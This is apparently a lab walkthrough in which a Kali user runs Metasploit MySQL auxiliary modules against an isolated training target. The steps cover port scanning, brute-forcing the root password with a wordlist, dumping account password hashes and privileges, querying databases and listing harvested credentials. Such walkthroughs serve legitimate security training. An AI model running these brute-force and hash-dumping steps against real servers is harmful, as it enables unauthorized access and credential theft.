In this lab, run the following **auxiliary modules** against the target:

- auxiliary/admin/mysql/mysql_enum
- auxiliary/admin/mysql/mysql_sql
- auxiliary/scanner/mysql/mysql_file_enum
- auxiliary/scanner/mysql/mysql_hashdump
- auxiliary/scanner/mysql/mysql_login
- auxiliary/scanner/mysql/mysql_schemadump
- auxiliary/scanner/mysql/mysql_version
- auxiliary/scanner/mysql/mysql_writable_dirs

Instructions: 

- This lab is dedicated to you! No other users are on this network :)
- Once you start the lab, you will have access to a root terminal of a Kali instance
- Your Kali has an interface with IP address 192.X.Y.2. Run "ip addr" to know the values of X and Y.
- The target server should be located at the IP address 192.X.Y.3.
- Do not attack the gateway located at IP address 192.X.Y.1
- postgresql is not running by default so Metasploit may give you an error about this when starting

---

[[ip]]

```
root@attackdefense:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
14586: eth0@if14587: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.3/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
14589: eth1@if14590: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:0f:a4:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.15.164.2/24 brd 192.15.164.255 scope global eth1
       valid_lft forever preferred_lft forever
```

[[ifconfig]]

```
root@attackdefense:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.3  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:03  txqueuelen 0  (Ethernet)
        RX packets 134  bytes 11806 (11.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 103  bytes 313674 (306.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.15.164.2  netmask 255.255.255.0  broadcast 192.15.164.255
        ether 02:42:c0:0f:a4:02  txqueuelen 0  (Ethernet)
        RX packets 16  bytes 1376 (1.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 18  bytes 1656 (1.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 18  bytes 1656 (1.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

[[metasploit]]

```
root@attackdefense:~# service postgresql start && msfconsole
[ ok ] Starting PostgreSQL 11 database server: main.
       =[ metasploit v5.0.18-dev                          ]
+ -- --=[ 1882 exploits - 1062 auxiliary - 328 post       ]
+ -- --=[ 546 payloads - 44 encoders - 10 nops            ]
+ -- --=[ 2 evasion                                       ]

msf5 > db_status 
[*] Connected to msf. Connection type: postgresql.
msf5 > workspace -a mysql_enum
[*] Added workspace: mysql_enum
[*] Workspace: mysql_enum
msf5 > setg rhosts 192.15.164.3
rhosts => 192.15.164.3
msf5 > 
```

```
msf5 > search type:auxiliary name:mysql

Matching Modules
================

   #   Name                                               Disclosure Date  Rank    Check  Description
   -   ----                                               ---------------  ----    -----  -----------
   1   auxiliary/admin/mysql/mysql_enum                                    normal  No     MySQL Enumeration Module
   2   auxiliary/admin/mysql/mysql_sql                                     normal  No     MySQL SQL Generic Query
   3   auxiliary/analyze/jtr_mysql_fast                                    normal  No     John the Ripper MySQL Password Cracker (Fast Mode)
   4   auxiliary/scanner/mysql/mysql_authbypass_hashdump  2012-06-09       normal  Yes    MySQL Authentication Bypass Password Dump
   5   auxiliary/scanner/mysql/mysql_file_enum                             normal  Yes    MYSQL File/Directory Enumerator
   6   auxiliary/scanner/mysql/mysql_hashdump                              normal  Yes    MYSQL Password Hashdump
   7   auxiliary/scanner/mysql/mysql_login                                 normal  Yes    MySQL Login Utility
   8   auxiliary/scanner/mysql/mysql_schemadump                            normal  Yes    MYSQL Schema Dump
   9   auxiliary/scanner/mysql/mysql_version                               normal  Yes    MySQL Server Version Enumeration
   10  auxiliary/scanner/mysql/mysql_writable_dirs                         normal  Yes    MYSQL Directory Write Test
   11  auxiliary/server/capture/mysql                                      normal  No     Authentication Capture: MySQL
```

```
msf5 > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   1  auxiliary/scanner/http/wordpress_pingback_access                   normal  Yes    Wordpress Pingback Locator
   2  auxiliary/scanner/natpmp/natpmp_portscan                           normal  Yes    NAT-PMP External Port Scanner
   3  auxiliary/scanner/portscan/ack                                     normal  Yes    TCP ACK Firewall Scanner
   4  auxiliary/scanner/portscan/ftpbounce                               normal  Yes    FTP Bounce Port Scanner
   5  auxiliary/scanner/portscan/syn                                     normal  Yes    TCP SYN Port Scanner
   6  auxiliary/scanner/portscan/tcp                                     normal  Yes    TCP Port Scanner
   7  auxiliary/scanner/portscan/xmas                                    normal  Yes    TCP "XMas" Port Scanner
   8  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner


msf5 > use auxiliary/scanner/portscan/tcp
msf5 auxiliary(scanner/portscan/tcp) > options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target address range or CIDR identifier
   THREADS      1                yes       The number of concurrent threads
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds
msf5 auxiliary(scanner/portscan/tcp) > run

[+] 192.15.164.3:         - 192.15.164.3:3306 - TCP OPEN
[*] 192.15.164.3:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/portscan/tcp) > use auxiliary/scanner/mysql/mysql_version
msf5 auxiliary(scanner/mysql/mysql_version) > options

Module options (auxiliary/scanner/mysql/mysql_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   192.15.164.3     yes       The target address range or CIDR identifier
   RPORT    3306             yes       The target port (TCP)
   THREADS  1                yes       The number of concurrent threads

msf5 auxiliary(scanner/mysql/mysql_version) > run

[+] 192.15.164.3:3306     - 192.15.164.3:3306 is running MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)
[*] 192.15.164.3:3306     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/mysql/mysql_version) >
```


```
msf5 auxiliary(scanner/mysql/mysql_version) > use auxiliary/scanner/mysql/mysql_login
msf5 auxiliary(scanner/mysql/mysql_login) > options

Module options (auxiliary/scanner/mysql/mysql_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS            192.15.164.3     yes       The target address range or CIDR identifier
   RPORT             3306             yes       The target port (TCP)
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

msf5 auxiliary(scanner/mysql/mysql_login) > set username root
username => root
msf5 auxiliary(scanner/mysql/mysql_login) > set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
pass_file => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf5 auxiliary(scanner/mysql/mysql_login) > set verbose false 
verbose => false
msf5 auxiliary(scanner/mysql/mysql_login) > run

[+] 192.15.164.3:3306     - 192.15.164.3:3306 - Success: 'root:twinkle'
[*] 192.15.164.3:3306     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/mysql/mysql_login) >
```

```
msf5 auxiliary(scanner/mysql/mysql_login) > use auxiliary/admin/mysql/mysql_enum
msf5 auxiliary(admin/mysql/mysql_enum) > options

Module options (auxiliary/admin/mysql/mysql_enum):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        The password for the specified username
   RHOSTS    192.15.164.3     yes       The target address range or CIDR identifier
   RPORT     3306             yes       The target port (TCP)
   USERNAME                   no        The username to authenticate as

msf5 auxiliary(admin/mysql/mysql_enum) > set username root
username => root
msf5 auxiliary(admin/mysql/mysql_enum) > set password twinkle
password => twinkle
msf5 auxiliary(admin/mysql/mysql_enum) > info

       Name: MySQL Enumeration Module
     Module: auxiliary/admin/mysql/mysql_enum
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Carlos Perez <carlos_perez@darkoperator.com>

Check supported:
  No

Basic options:
  Name      Current Setting  Required  Description
  ----      ---------------  --------  -----------
  PASSWORD  twinkle          no        The password for the specified username
  RHOSTS    192.15.164.3     yes       The target address range or CIDR identifier
  RPORT     3306             yes       The target port (TCP)
  USERNAME  root             no        The username to authenticate as

Description:
  This module allows for simple enumeration of MySQL Database Server 
  provided proper credentials to connect remotely.

References:
  CVE: Not available
  https://cisecurity.org/benchmarks.html

msf5 auxiliary(admin/mysql/mysql_enum) > run
[*] Running module against 192.15.164.3

[*] 192.15.164.3:3306 - Running MySQL Enumerator...
[*] 192.15.164.3:3306 - Enumerating Parameters
[*] 192.15.164.3:3306 -         MySQL Version: 5.5.61-0ubuntu0.14.04.1
[*] 192.15.164.3:3306 -         Compiled for the following OS: debian-linux-gnu
[*] 192.15.164.3:3306 -         Architecture: x86_64
[*] 192.15.164.3:3306 -         Server Hostname: victim-1
[*] 192.15.164.3:3306 -         Data Directory: /var/lib/mysql/
[*] 192.15.164.3:3306 -         Logging of queries and logins: OFF
[*] 192.15.164.3:3306 -         Old Password Hashing Algorithm OFF
[*] 192.15.164.3:3306 -         Loading of local files: ON
[*] 192.15.164.3:3306 -         Deny logins with old Pre-4.1 Passwords: OFF
[*] 192.15.164.3:3306 -         Allow Use of symlinks for Database Files: YES
[*] 192.15.164.3:3306 -         Allow Table Merge: 
[*] 192.15.164.3:3306 -         SSL Connection: DISABLED
[*] 192.15.164.3:3306 - Enumerating Accounts:
[*] 192.15.164.3:3306 -         List of Accounts with Password Hashes:
[+] 192.15.164.3:3306 -                 User: root Host: localhost Password Hash: *A0E23B565BACCE3E70D223915ABF2554B2540144
[+] 192.15.164.3:3306 -                 User: root Host: 891b50fafb0f Password Hash: 
[+] 192.15.164.3:3306 -                 User: root Host: 127.0.0.1 Password Hash: 
[+] 192.15.164.3:3306 -                 User: root Host: ::1 Password Hash: 
[+] 192.15.164.3:3306 -                 User: debian-sys-maint Host: localhost Password Hash: *F4E71A0BE028B3688230B992EEAC70BC598FA723
[+] 192.15.164.3:3306 -                 User: root Host: % Password Hash: *A0E23B565BACCE3E70D223915ABF2554B2540144
[+] 192.15.164.3:3306 -                 User: filetest Host: % Password Hash: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
[+] 192.15.164.3:3306 -                 User: ultra Host: localhost Password Hash: *94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29
[+] 192.15.164.3:3306 -                 User: guest Host: localhost Password Hash: *17FD2DDCC01E0E66405FB1BA16F033188D18F646
[+] 192.15.164.3:3306 -                 User: gopher Host: localhost Password Hash: *027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
[+] 192.15.164.3:3306 -                 User: backup Host: localhost Password Hash: *E6DEAD2645D88071D28F004A209691AC60A72AC9
[+] 192.15.164.3:3306 -                 User: sysadmin Host: localhost Password Hash: *78A1258090DAA81738418E11B73EB494596DFDD3
[*] 192.15.164.3:3306 -         The following users have GRANT Privilege:
[*] 192.15.164.3:3306 -                 User: root Host: localhost
[*] 192.15.164.3:3306 -                 User: root Host: 891b50fafb0f
[*] 192.15.164.3:3306 -                 User: root Host: 127.0.0.1
[*] 192.15.164.3:3306 -                 User: root Host: ::1
[*] 192.15.164.3:3306 -                 User: debian-sys-maint Host: localhost
[*] 192.15.164.3:3306 -                 User: root Host: %
[*] 192.15.164.3:3306 -         The following users have CREATE USER Privilege:
[*] 192.15.164.3:3306 -                 User: root Host: localhost
[*] 192.15.164.3:3306 -                 User: root Host: 891b50fafb0f
[*] 192.15.164.3:3306 -                 User: root Host: 127.0.0.1
[*] 192.15.164.3:3306 -                 User: root Host: ::1
[*] 192.15.164.3:3306 -                 User: debian-sys-maint Host: localhost
[*] 192.15.164.3:3306 -                 User: root Host: %
[*] 192.15.164.3:3306 -         The following users have RELOAD Privilege:
[*] 192.15.164.3:3306 -                 User: root Host: localhost
[*] 192.15.164.3:3306 -                 User: root Host: 891b50fafb0f
[*] 192.15.164.3:3306 -                 User: root Host: 127.0.0.1
[*] 192.15.164.3:3306 -                 User: root Host: ::1
[*] 192.15.164.3:3306 -                 User: debian-sys-maint Host: localhost
[*] 192.15.164.3:3306 -                 User: root Host: %
[*] 192.15.164.3:3306 -         The following users have SHUTDOWN Privilege:
[*] 192.15.164.3:3306 -                 User: root Host: localhost
[*] 192.15.164.3:3306 -                 User: root Host: 891b50fafb0f
[*] 192.15.164.3:3306 -                 User: root Host: 127.0.0.1
[*] 192.15.164.3:3306 -                 User: root Host: ::1
[*] 192.15.164.3:3306 -                 User: debian-sys-maint Host: localhost
[*] 192.15.164.3:3306 -                 User: root Host: %
[*] 192.15.164.3:3306 -         The following users have SUPER Privilege:
[*] 192.15.164.3:3306 -                 User: root Host: localhost
[*] 192.15.164.3:3306 -                 User: root Host: 891b50fafb0f
[*] 192.15.164.3:3306 -                 User: root Host: 127.0.0.1
[*] 192.15.164.3:3306 -                 User: root Host: ::1
[*] 192.15.164.3:3306 -                 User: debian-sys-maint Host: localhost
[*] 192.15.164.3:3306 -                 User: root Host: %
[*] 192.15.164.3:3306 -         The following users have FILE Privilege:
[*] 192.15.164.3:3306 -                 User: root Host: localhost
[*] 192.15.164.3:3306 -                 User: root Host: 891b50fafb0f
[*] 192.15.164.3:3306 -                 User: root Host: 127.0.0.1
[*] 192.15.164.3:3306 -                 User: root Host: ::1
[*] 192.15.164.3:3306 -                 User: debian-sys-maint Host: localhost
[*] 192.15.164.3:3306 -                 User: root Host: %
[*] 192.15.164.3:3306 -                 User: filetest Host: %
[*] 192.15.164.3:3306 -         The following users have PROCESS Privilege:
[*] 192.15.164.3:3306 -                 User: root Host: localhost
[*] 192.15.164.3:3306 -                 User: root Host: 891b50fafb0f
[*] 192.15.164.3:3306 -                 User: root Host: 127.0.0.1
[*] 192.15.164.3:3306 -                 User: root Host: ::1
[*] 192.15.164.3:3306 -                 User: debian-sys-maint Host: localhost
[*] 192.15.164.3:3306 -                 User: root Host: %
[*] 192.15.164.3:3306 -         The following accounts have privileges to the mysql database:
[*] 192.15.164.3:3306 -                 User: root Host: localhost
[*] 192.15.164.3:3306 -                 User: root Host: 891b50fafb0f
[*] 192.15.164.3:3306 -                 User: root Host: 127.0.0.1
[*] 192.15.164.3:3306 -                 User: root Host: ::1
[*] 192.15.164.3:3306 -                 User: debian-sys-maint Host: localhost
[*] 192.15.164.3:3306 -                 User: root Host: %
[*] 192.15.164.3:3306 -         The following accounts have empty passwords:
[*] 192.15.164.3:3306 -                 User: root Host: 891b50fafb0f
[*] 192.15.164.3:3306 -                 User: root Host: 127.0.0.1
[*] 192.15.164.3:3306 -                 User: root Host: ::1
[*] 192.15.164.3:3306 -         The following accounts are not restricted by source:
[*] 192.15.164.3:3306 -                 User: filetest Host: %
[*] 192.15.164.3:3306 -                 User: root Host: %
[*] Auxiliary module execution completed
msf5 auxiliary(admin/mysql/mysql_enum) >
```

```
msf5 auxiliary(admin/mysql/mysql_enum) > use auxiliary/admin/mysql/mysql_sql
msf5 auxiliary(admin/mysql/mysql_sql) > options

Module options (auxiliary/admin/mysql/mysql_sql):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   PASSWORD                    no        The password for the specified username
   RHOSTS    192.15.164.3      yes       The target address range or CIDR identifier
   RPORT     3306              yes       The target port (TCP)
   SQL       select version()  yes       The SQL to execute.
   USERNAME                    no        The username to authenticate as

msf5 auxiliary(admin/mysql/mysql_sql) > set username root
username => root
msf5 auxiliary(admin/mysql/mysql_sql) > set password twinkle
password => twinkle
msf5 auxiliary(admin/mysql/mysql_sql) > run
[*] Running module against 192.15.164.3

[*] 192.15.164.3:3306 - Sending statement: 'select version()'...
[*] 192.15.164.3:3306 -  | 5.5.61-0ubuntu0.14.04.1 |
[*] Auxiliary module execution completed
msf5 auxiliary(admin/mysql/mysql_sql) > set sql show databases;
sql => show databases;
msf5 auxiliary(admin/mysql/mysql_sql) > run
[*] Running module against 192.15.164.3

[*] 192.15.164.3:3306 - Sending statement: 'show databases;'...
[*] 192.15.164.3:3306 -  | information_schema |
[*] 192.15.164.3:3306 -  | mysql |
[*] 192.15.164.3:3306 -  | performance_schema |
[*] 192.15.164.3:3306 -  | upload |
[*] 192.15.164.3:3306 -  | vendors |
[*] 192.15.164.3:3306 -  | videos |
[*] 192.15.164.3:3306 -  | warehouse |
[*] Auxiliary module execution completed
msf5 auxiliary(admin/mysql/mysql_sql) >
```

```
msf5 auxiliary(admin/mysql/mysql_sql) > use auxiliary/scanner/mysql/mysql_schemadump
msf5 auxiliary(scanner/mysql/mysql_schemadump) > options

Module options (auxiliary/scanner/mysql/mysql_schemadump):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   DISPLAY_RESULTS  true             yes       Display the Results to the Screen
   PASSWORD                          no        The password for the specified username
   RHOSTS           192.15.164.3     yes       The target address range or CIDR identifier
   RPORT            3306             yes       The target port (TCP)
   THREADS          1                yes       The number of concurrent threads
   USERNAME                          no        The username to authenticate as

msf5 auxiliary(scanner/mysql/mysql_schemadump) > set password twinkle
password => twinkle
msf5 auxiliary(scanner/mysql/mysql_schemadump) > set username root
username => root
msf5 auxiliary(scanner/mysql/mysql_schemadump) > run

[+] 192.15.164.3:3306     - Schema stored in: /root/.msf4/loot/20230730154139_default_192.15.164.3_mysql_schema_737453.txt
[+] 192.15.164.3:3306     - MySQL Server Schema 
 Host: 192.15.164.3 
 Port: 3306 
 ====================

---
- DBName: upload
  Tables: []
- DBName: vendors
  Tables: []
- DBName: videos
  Tables: []
- DBName: warehouse
  Tables: []

[*] 192.15.164.3:3306     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/mysql/mysql_schemadump) >
```

```
msf5 auxiliary(scanner/mysql/mysql_schemadump) > hosts

Hosts
=====

address       mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------       ---  ----  -------  ---------  -----  -------  ----  --------
192.15.164.3             Unknown                    device         

msf5 auxiliary(scanner/mysql/mysql_schemadump) > services
Services
========

host          port  proto  name   state  info
----          ----  -----  ----   -----  ----
192.15.164.3  3306  tcp    mysql  open   5.5.61-0ubuntu0.14.04.1

msf5 auxiliary(scanner/mysql/mysql_schemadump) > loot

Loot
====

host          service  type          name                           content     info          path
----          -------  ----          ----                           -------     ----          ----
192.15.164.3  mysql    mysql_schema  192.15.164.3_mysql_schema.txt  text/plain  MySQL Schema  /root/.msf4/loot/20230730154139_default_192.15.164.3_mysql_schema_737453.txt

msf5 auxiliary(scanner/mysql/mysql_schemadump) > creds
Credentials
===========

host          origin        service           public            private                                    realm  private_type        JtR Format
----          ------        -------           ------            -------                                    -----  ------------        ----------
192.15.164.3  192.15.164.3  3306/tcp (mysql)  root                                                                Blank password      
192.15.164.3  192.15.164.3  3306/tcp (mysql)  root              *A0E23B565BACCE3E70D223915ABF2554B2540144         Nonreplayable hash  mysql,mysql-sha1
192.15.164.3  192.15.164.3  3306/tcp (mysql)  root              twinkle                                           Password            
192.15.164.3  192.15.164.3  3306/tcp (mysql)  debian-sys-maint  *F4E71A0BE028B3688230B992EEAC70BC598FA723         Nonreplayable hash  mysql,mysql-sha1
192.15.164.3  192.15.164.3  3306/tcp (mysql)  filetest          *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B         Nonreplayable hash  mysql,mysql-sha1
192.15.164.3  192.15.164.3  3306/tcp (mysql)  ultra             *94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29         Nonreplayable hash  mysql,mysql-sha1
192.15.164.3  192.15.164.3  3306/tcp (mysql)  guest             *17FD2DDCC01E0E66405FB1BA16F033188D18F646         Nonreplayable hash  mysql,mysql-sha1
192.15.164.3  192.15.164.3  3306/tcp (mysql)  gopher            *027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0         Nonreplayable hash  mysql,mysql-sha1
192.15.164.3  192.15.164.3  3306/tcp (mysql)  backup            *E6DEAD2645D88071D28F004A209691AC60A72AC9         Nonreplayable hash  mysql,mysql-sha1
192.15.164.3  192.15.164.3  3306/tcp (mysql)  sysadmin          *78A1258090DAA81738418E11B73EB494596DFDD3         Nonreplayable hash  mysql,mysql-sha1

msf5 auxiliary(scanner/mysql/mysql_schemadump) >
```

```
root@attackdefense:~# mysql 192.15.164.3 -u root -p        
Enter password: 
ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2)
root@attackdefense:~# mysql -h 192.15.164.3 -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 1011
Server version: 5.5.61-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| upload             |
| vendors            |
| videos             |
| warehouse          |
+--------------------+
7 rows in set (0.001 sec)

MySQL [(none)]> use videos;
Database changed
MySQL [videos]> show tables;
Empty set (0.000 sec)

MySQL [videos]>
```